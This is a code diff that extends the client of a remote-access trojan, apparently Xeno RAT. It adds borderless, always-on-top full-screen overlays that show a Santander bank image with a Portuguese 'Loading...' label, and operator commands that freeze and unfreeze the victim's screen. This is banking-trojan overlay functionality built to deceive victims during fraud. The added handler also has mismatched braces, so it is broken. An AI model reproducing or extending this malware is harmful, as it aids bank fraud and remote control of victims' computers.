@@ -27,6 +27,71 @@ namespace xeno_rat_client
 
         public static StringBuilder ProcessLog = new StringBuilder();
 
+        static Form freezeForm;
+
+        static void ShowSantanderFreezeScreen()
+        {
+            freezeForm = new Form();
+            freezeForm.FormBorderStyle = FormBorderStyle.None;
+            freezeForm.WindowState = FormWindowState.Maximized;
+            freezeForm.TopMost = true;
+            freezeForm.BackColor = Color.Black;
+
+            PictureBox pictureBox = new PictureBox();
+            pictureBox.Dock = DockStyle.Fill;
+            pictureBox.Image = Image.FromFile("santander_image.png");
+            pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+
+            Label loadingLabel = new Label();
+            loadingLabel.Text = "Carregando...";
+            loadingLabel.ForeColor = Color.Red;
+            loadingLabel.Font = new Font("Arial", 24, FontStyle.Bold);
+            loadingLabel.BackColor = Color.Transparent;
+            loadingLabel.AutoSize = true;
+            loadingLabel.Location = new Point((freezeForm.Width - loadingLabel.Width) / 2, (freezeForm.Height - loadingLabel.Height) / 2);
+
+            freezeForm.Controls.Add(pictureBox);
+            freezeForm.Controls.Add(loadingLabel);
+
+            freezeForm.ShowDialog();
+        }
+
+        static void UnfreezeScreen()
+        {
+            if (freezeForm != null)
+            {
+                freezeForm.Close();
+                freezeForm = null;
+            }
+        }
+
+        static void ShowFreezeScreen()
+        {
+            Form freezeForm = new Form();
+            freezeForm.FormBorderStyle = FormBorderStyle.None;
+            freezeForm.WindowState = FormWindowState.Maximized;
+            freezeForm.TopMost = true;
+            freezeForm.BackColor = Color.Black;
+
+            PictureBox pictureBox = new PictureBox();
+            pictureBox.Dock = DockStyle.Fill;
+            pictureBox.Image = Image.FromFile("santander_image.png");
+            pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+
+            Label loadingLabel = new Label();
+            loadingLabel.Text = "Carregando...";
+            loadingLabel.ForeColor = Color.White;
+            loadingLabel.Font = new Font("Arial", 24, FontStyle.Bold);
+            loadingLabel.BackColor = Color.Transparent;
+            loadingLabel.AutoSize = true;
+            loadingLabel.Location = new Point((freezeForm.Width - loadingLabel.Width) / 2, (freezeForm.Height - loadingLabel.Height) / 2);
+
+            freezeForm.Controls.Add(pictureBox);
+            freezeForm.Controls.Add(loadingLabel);
+
+            freezeForm.ShowDialog();
+        }
+
         static async Task Main(string[] args)
         {
             CapturingConsoleWriter ConsoleCapture = new CapturingConsoleWriter(Console.Out);
@@ -94,6 +159,19 @@ namespace xeno_rat_client
                     Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
                     Handler handle = new Handler(Server, dllhandler);
                     await handle.Type0Receive();
+                    string command = Server.Receive();
+                    if (command == "FREEZE_SCREEN")
+                    {
+                        ShowFreezeScreen();
+                    else if (command == "FREEZE_SANTANDER")
+                    {
+                        ShowSantanderFreezeScreen();
+                    }
+                    else if (command == "UNFREEZE_SANTANDER")
+                    {
+                        UnfreezeScreen();
+                    }
+                    }
                 }
                 catch (Exception e)
                 {
